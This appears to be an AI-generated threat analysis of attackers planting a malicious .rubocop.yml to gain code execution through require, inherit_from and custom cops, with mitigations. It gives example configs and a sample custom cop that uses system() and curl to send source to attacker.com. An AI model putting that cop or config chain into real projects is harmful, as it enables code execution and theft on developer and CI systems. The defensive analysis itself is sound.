Okay, here's a deep analysis of the provided attack tree path, focusing on the context of an application using RuboCop, with a cybersecurity expert's perspective.

## Deep Analysis of Attack Tree Path: [[Place file on filesystem]] (RuboCop .rubocop.yml)

### 1. Define Objective

**Objective:** To thoroughly analyze the security implications of an attacker successfully placing or modifying a `.rubocop.yml` file on the filesystem of a system running an application that utilizes RuboCop.  This analysis aims to understand the potential impact, identify contributing factors, and propose mitigation strategies.  We are specifically focusing on *how* this placement enables further exploitation, not just the fact that it happened.

### 2. Scope

*   **Target System:**  Any system (development machine, CI/CD server, production server â€“ if RuboCop is used there) where an application using RuboCop is running or being developed.  This includes systems where RuboCop might be executed as part of a build process, testing pipeline, or even manually by developers.
*   **File of Interest:**  `.rubocop.yml` (and any files it includes via `inherit_from`).  We'll also consider the possibility of influencing the location of this file.
*   **Attacker Capabilities:**  The attacker is assumed to have *some* level of access that allows them to write to the filesystem.  This could range from low-privilege user access (e.g., through a compromised web application account) to higher-privilege access (e.g., through SSH or RDP).  The specific *method* of gaining this access is outside the scope of *this* analysis (that would be covered by other branches of the attack tree), but we will consider the implications of different access levels.
*   **RuboCop Context:** We are focusing on how RuboCop's configuration loading and execution behavior can be abused *after* the file is placed.  We assume the attacker understands RuboCop's configuration options.
* **Exclusions:** This analysis does not cover vulnerabilities *within* RuboCop itself (e.g., a buffer overflow in a custom cop).  It focuses on the misuse of legitimate RuboCop features.

### 3. Methodology

1.  **Impact Assessment:**  Determine the worst-case scenarios that could result from a malicious `.rubocop.yml` file being loaded.  This includes code execution, data exfiltration, and denial of service.
2.  **Vulnerability Analysis:**  Identify specific RuboCop configuration options and features that can be abused to achieve the impacts identified in step 1.
3.  **Exploitation Scenarios:**  Describe realistic scenarios where an attacker could leverage these vulnerabilities, considering different access levels and system contexts.
4.  **Mitigation Recommendations:**  Propose concrete steps to prevent or mitigate the risks identified, focusing on secure coding practices, system hardening, and secure RuboCop configuration management.
5.  **Dependency Analysis:** Consider how the attack might be chained with other vulnerabilities or attack vectors.

### 4. Deep Analysis of the Attack Tree Path

**4.1 Impact Assessment (Worst-Case Scenarios)**

*   **Remote Code Execution (RCE):**  This is the most severe impact.  A malicious `.rubocop.yml` could configure RuboCop to execute arbitrary code, potentially giving the attacker full control over the system.
*   **Data Exfiltration:**  The attacker could use RuboCop to read sensitive files (e.g., configuration files, source code, API keys) and send them to a remote server.
*   **Denial of Service (DoS):**  A malicious configuration could cause RuboCop to consume excessive resources (CPU, memory), making the system unresponsive or crashing the application.  This could also be achieved by introducing infinite loops or other resource-intensive operations.
*   **Code Modification (Subtle):**  An attacker could subtly alter code through RuboCop's auto-correction features, introducing vulnerabilities or backdoors that are difficult to detect. This is particularly dangerous in CI/CD pipelines.
*   **Information Disclosure:**  RuboCop could be configured to output sensitive information to logs or other accessible locations.
*   **Lateral Movement:** If the compromised system is a development machine or CI/CD server, the attacker could use the RCE to pivot to other systems on the network.

**4.2 Vulnerability Analysis (Abusable RuboCop Features)**

*   **`require`:**  This directive allows loading arbitrary Ruby files.  A malicious `.rubocop.yml` could `require` a file containing malicious code, leading to RCE.  This is the *primary* vector for RCE.
    ```yaml
    # Malicious .rubocop.yml
    require: /path/to/malicious_code.rb
    ```
*   **Custom Cops:**  RuboCop allows defining custom cops in separate Ruby files.  These custom cops can contain arbitrary code.  The attacker could place a malicious custom cop file and then reference it in the `.rubocop.yml`.
    ```yaml
    # Malicious .rubocop.yml
    require: /path/to/custom_cops.rb
    MyEvilCop:
      Enabled: true
    ```
*   **`inherit_from`:**  This directive allows including configuration from other YAML files.  An attacker could use this to chain multiple malicious configuration files or to include a seemingly benign file that then `require`s malicious code.  This can be used to obfuscate the attack.
    ```yaml
    # Malicious .rubocop.yml
    inherit_from: /path/to/seemingly_benign.yml
    ```
    `/path/to/seemingly_benign.yml` might then contain:
    ```yaml
    require: /path/to/actual_malicious_code.rb
    ```
*   **`AllCops/DisabledByDefault: true` and selectively enabling malicious cops:**  This allows an attacker to disable all standard cops and only enable their custom, malicious ones, minimizing the chance of detection by standard RuboCop configurations.
*   **Auto-Correction Abuse:**  Even seemingly harmless cops, if configured with aggressive auto-correction, could be used to modify code in unintended ways.  For example, a cop that automatically removes unused variables could be tricked into removing a crucial security check.
*   **External Commands (e.g., `system`, `` ` ``):**  If a custom cop uses Ruby's `system` command or backticks to execute external commands, the attacker can inject arbitrary commands.  This is a direct path to RCE.
    ```ruby
    # Inside a malicious custom cop (malicious_code.rb)
    class MyEvilCop < RuboCop::Cop::Cop
      def on_send(node)
        if node.method_name == :puts
          system("curl http://attacker.com/exfiltrate?data=#{node.source}") # Exfiltrate data
        end
      end
    end
    ```
* **TargetRubyVersion:** While not directly exploitable for RCE, setting an extremely old or new `TargetRubyVersion` could lead to unexpected behavior or crashes, potentially creating a DoS.

**4.3 Exploitation Scenarios**

*   **Scenario 1: Compromised Web Application (Low Privilege)**
    *   The attacker exploits a vulnerability in a web application (e.g., SQL injection, cross-site scripting) to gain write access to a directory within the application's codebase.
    *   They upload a malicious `.rubocop.yml` file to this directory.
    *   The next time RuboCop is run (e.g., by a developer, a scheduled task, or a CI/CD pipeline), the malicious configuration is loaded, leading to RCE.
*   **Scenario 2: Compromised CI/CD Server (High Privilege)**
    *   The attacker gains access to the CI/CD server (e.g., through a compromised SSH key, a vulnerability in the CI/CD software).
    *   They modify the `.rubocop.yml` file in the repository or on the server's filesystem.
    *   The next build triggers RuboCop, executing the malicious code and potentially compromising the entire build pipeline and any deployed artifacts.
*   **Scenario 3: Developer Machine Compromise (Medium Privilege)**
    *   The attacker phishes a developer and gains access to their workstation.
    *   They modify the global RuboCop configuration file (e.g., `~/.rubocop.yml`) or a project-specific `.rubocop.yml`.
    *   The next time the developer runs RuboCop, the malicious code is executed.
*   **Scenario 4: Supply Chain Attack (High Privilege)**
    *   The attacker compromises a gem that provides custom RuboCop cops.
    *   The compromised gem includes a malicious `.rubocop.yml` or a malicious custom cop.
    *   Any project that uses this gem will be vulnerable when RuboCop is run.

**4.4 Mitigation Recommendations**

*   **Principle of Least Privilege:**  Ensure that processes running RuboCop (e.g., CI/CD pipelines, developer workstations) have the minimum necessary privileges.  They should *not* have write access to critical system directories or the ability to execute arbitrary commands.
*   **Secure Configuration Management:**
    *   **Treat `.rubocop.yml` as code:**  Subject it to the same security reviews and controls as any other code in the repository.  Use version control and track changes.
    *   **Avoid `require` and custom cops if possible:**  If you don't need them, don't use them.  This significantly reduces the attack surface.
    *   **If using custom cops, review them thoroughly:**  Ensure they don't execute external commands or load arbitrary files.  Use static analysis tools to check for potential vulnerabilities.
    *   **Use a whitelist of allowed cops:**  Instead of disabling cops, explicitly enable only the ones you need.
    *   **Consider a central, read-only RuboCop configuration:**  Store the `.rubocop.yml` in a secure, read-only location and have projects inherit from it.  This prevents individual projects or developers from modifying the configuration.
    *   **Validate `inherit_from` paths:** If using `inherit_from`, ensure that the paths are relative and point to trusted locations within the repository.  Avoid absolute paths.
*   **System Hardening:**
    *   **Restrict write access to the filesystem:**  Limit the directories where RuboCop can be configured and where it can load files from.
    *   **Use a secure CI/CD environment:**  Implement strong access controls, network segmentation, and monitoring for your CI/CD pipeline.
    *   **Regularly update RuboCop and its dependencies:**  This helps protect against known vulnerabilities in RuboCop itself.
*   **Code Review and Static Analysis:**
    *   **Review all changes to `.rubocop.yml`:**  Treat these changes as security-critical.
    *   **Use static analysis tools to scan for malicious code:**  This can help detect attempts to inject code through custom cops or `require` directives.
*   **Runtime Monitoring:**
    *   **Monitor RuboCop's execution:**  Look for suspicious activity, such as unexpected file access, network connections, or high resource usage.
* **Sandboxing:** Run Rubocop in sandboxed environment.

**4.5 Dependency Analysis**

*   **Web Application Vulnerabilities:**  The initial compromise often relies on vulnerabilities in the web application itself (e.g., SQL injection, XSS, file upload vulnerabilities).  Addressing these vulnerabilities is crucial to preventing the attacker from placing the malicious `.rubocop.yml` in the first place.
*   **CI/CD System Security:**  The security of the CI/CD pipeline is paramount.  A compromised CI/CD server can be used to inject malicious code into builds and deployments.
*   **Developer Workstation Security:**  Compromised developer machines can be used to modify `.rubocop.yml` files or introduce malicious custom cops.
*   **Supply Chain Security:**  Vulnerabilities in third-party gems, especially those providing custom RuboCop cops, can be exploited.

### 5. Conclusion

The ability to place a malicious `.rubocop.yml` file on a system represents a significant security risk, primarily due to RuboCop's ability to load and execute arbitrary Ruby code through the `require` directive and custom cops.  This can lead to RCE, data exfiltration, and other severe consequences.  Mitigation requires a multi-layered approach, including secure configuration management, system hardening, code review, and runtime monitoring.  By treating `.rubocop.yml` as a security-critical component and applying the principle of least privilege, organizations can significantly reduce the risk of this type of attack. The most important mitigation is to avoid using `require` and custom cops unless absolutely necessary, and if they are used, to review them extremely carefully.
